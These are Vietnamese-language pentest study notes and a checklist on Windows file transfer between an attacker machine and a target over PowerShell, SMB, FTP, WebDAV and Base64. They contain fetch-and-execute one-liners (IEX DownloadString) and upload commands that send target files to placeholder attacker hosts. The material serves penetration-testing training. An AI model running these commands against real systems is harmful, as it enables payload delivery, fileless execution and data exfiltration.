# Windows File Transfer Methods

## Mục tiêu

Khi pentest Windows, ta thường cần chuyển file giữa máy attacker/Pwnbox và Windows target.

Có 2 hướng chính:

- Download: attacker -> target
- Upload: target -> attacker

Dùng để:

- Đưa tool/payload vào target: `nc.exe`, `winPEAS.exe`, script PowerShell
- Lấy file từ target về attacker: proof, config, log, database, output scan
- Transfer trong môi trường shell yếu hoặc bị hạn chế mạng

## Các phương pháp phổ biến

Windows có nhiều công cụ native hỗ trợ file transfer:

- PowerShell
- SMB
- FTP
- WebDAV
- Base64 encode/decode
- LOLBins: Certutil, Bitsadmin, WMIC, Regsvr32

## Fileless

Fileless không có nghĩa là không có file transfer.

Nó thường là:

- Payload/script được tải về
- Xử lý hoặc decode trong memory
- Chạy trực tiếp mà không ghi file rõ ràng xuống disk

Ví dụ:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
```
- `DownloadString`: tải nội dung script thành string
- `IEX`: thực thi nội dung đó trong PowerShell

## Base64 Transfer

Dùng khi không transfer file trực tiếp được.

Linux encode:

```
cat file | base64 -w 0; echo
```

Windows decode:

```
[IO.File]::WriteAllBytes("C:\Path\file", [Convert]::FromBase64String("<BASE64>"))
```

Check hash:

```
md5sum file
```

```
Get-FileHash C:\Path\file -Algorithm MD5
```

## PowerShell Download

Download file xuống disk:

```
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\Path\file')
```

Run script trong memory:

```
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
```

Invoke-WebRequest:

```
Invoke-WebRequest http://ATTACKER/file -OutFile file
```

Nếu lỗi IE parsing:

```
Invoke-WebRequest http://ATTACKER/file -UseBasicParsing -OutFile file
```

## SMB Download

Attacker tạo SMB server:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Windows copy file:

```
copy \\ATTACKER_IP\share\nc.exe
```

Nếu guest bị chặn, tạo SMB có user/password:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Windows mount share:

```
net use n: \\ATTACKER_IP\share /user:test test
copy n:\nc.exe
```

## FTP Download

Attacker bật FTP server:

```
sudo python3 -m pyftpdlib --port 21
```

Windows PowerShell download:

```
(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER/file.txt','C:\Users\Public\file.txt')
```

FTP non-interactive:

```
echo open ATTACKER_IP > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Upload

PowerShell encode file thành Base64:

```
[Convert]::ToBase64String((Get-Content -Path "C:\Path\file" -Encoding Byte))
```

Linux decode:

```
echo <BASE64> | base64 -d > file
```

Attacker bật upload server:

```
python3 -m uploadserver
```

PowerShell upload script:

```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PSUpload.ps1')
Invoke-FileUpload -Uri http://ATTACKER:8000/upload -File C:\Path\file
```

FTP upload:

```
sudo python3 -m pyftpdlib --port 21 --write
```

```
(New-Object Net.WebClient).UploadFile('ftp://ATTACKER/output','C:\Path\file')
```

WebDAV:

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```
copy C:\Path\file \\ATTACKER_IP\DavWWWRoot\
```

## Ghi nhớ

- Nếu HTTP dùng được: ưu tiên PowerShell/WebClient/Invoke-WebRequest.
- Nếu SMB dùng được: dùng impacket-smbserver rất nhanh.
- Nếu không transfer trực tiếp được: dùng Base64.
- Nếu cần lấy file từ target về attacker: dùng uploadserver, FTP upload hoặc WebDAV.
- Sau khi transfer file quan trọng, luôn check hash để đảm bảo file không lỗi.

---
# Windows File Transfer Checklist  
  
## 1. Chuẩn bị thông tin  
  
- [ ] Xác định IP attacker/Pwnbox.  
- [ ] Xác định IP Windows target.  
- [ ] Xác định hướng transfer:  
- [ ] Attacker -> Target  
- [ ] Target -> Attacker  
- [ ] Xác định shell hiện tại là:  
- [ ] PowerShell  
- [ ] cmd.exe  
- [ ] reverse shell yếu  
- [ ] RDP/GUI  
- [ ] Xác định port nào có thể dùng:  
- [ ] HTTP 8000/80  
- [ ] SMB 445  
- [ ] FTP 21  
- [ ] WebDAV 80  
  
## 2. Test kết nối từ target về attacker  
  
Trên attacker bật HTTP server:  
  
```bash  
python3 -m http.server 8000
```
Trên Windows target test:

```
Invoke-WebRequest http://ATTACKER_IP:8000/
```

Nếu nhận được request trên attacker là kết nối OK.

## 3. Download bằng PowerShell

- [ ]  Đặt file cần tải trong thư mục HTTP server.
- [ ]  Chạy trên attacker:

```
python3 -m http.server 8000
```

- [ ]  Chạy trên Windows target:

```
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/file.exe','C:\Users\Public\file.exe')
```

- [ ]  Kiểm tra file tồn tại:

```
dir C:\Users\Public\file.exe
```

## 4. Chạy script trong memory

- [ ]  Host script trên attacker:

```
python3 -m http.server 8000
```

- [ ]  Chạy trên target:

```
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1')
```

- [ ]  Dùng khi muốn tránh ghi file `.ps1` xuống disk.

## 5. Download bằng SMB

- [ ]  Tạo SMB share trên attacker:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- [ ]  Copy từ Windows:

```
copy \\ATTACKER_IP\share\nc.exe C:\Users\Public\nc.exe
```

- [ ]  Nếu guest bị chặn, dùng user/password:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```
net use n: \\ATTACKER_IP\share /user:test test
copy n:\nc.exe C:\Users\Public\nc.exe
```

## 6. Download bằng FTP

- [ ]  Bật FTP server trên attacker:

```
sudo python3 -m pyftpdlib --port 21
```

- [ ]  Download từ Windows:

```
(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER_IP/file.txt','C:\Users\Public\file.txt')
```

## 7. Transfer bằng Base64

Linux encode:

```
cat file | base64 -w 0; echo
```

Windows decode:

```
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("<BASE64>"))
```

Check hash:

```
md5sum file
```

```
Get-FileHash C:\Users\Public\file -Algorithm MD5
```

## 8. Upload từ Windows về attacker

### Cách 1: Base64

Windows encode:

```
[Convert]::ToBase64String((Get-Content -Path "C:\Path\file" -Encoding Byte))
```

Linux decode:

```
echo <BASE64> | base64 -d > file
```

### Cách 2: uploadserver

Attacker:

```
python3 -m uploadserver
```

Target:

```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PSUpload.ps1')

Invoke-FileUpload -Uri http://ATTACKER_IP:8000/upload -File C:\Path\file
```

### Cách 3: FTP upload

Attacker:

```
sudo python3 -m pyftpdlib --port 21 --write
```

Target:

```
(New-Object Net.WebClient).UploadFile('ftp://ATTACKER_IP/output','C:\Path\file')
```

### Cách 4: WebDAV

Attacker:

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Target:

```
copy C:\Path\file \\ATTACKER_IP\DavWWWRoot\
```

## 9. Khi bị lỗi

- [ ]  Kiểm tra IP attacker đúng chưa.
- [ ]  Kiểm tra firewall/VPN.
- [ ]  Kiểm tra HTTP/SMB/FTP server có đang chạy không.
- [ ]  Kiểm tra target có outbound connection được không.
- [ ]  Thử đổi port, ví dụ 8000 -> 80.
- [ ]  Thử phương pháp khác: HTTP, SMB, FTP, WebDAV, Base64.
- [ ]  Kiểm tra file có bị AV/Defender xóa không.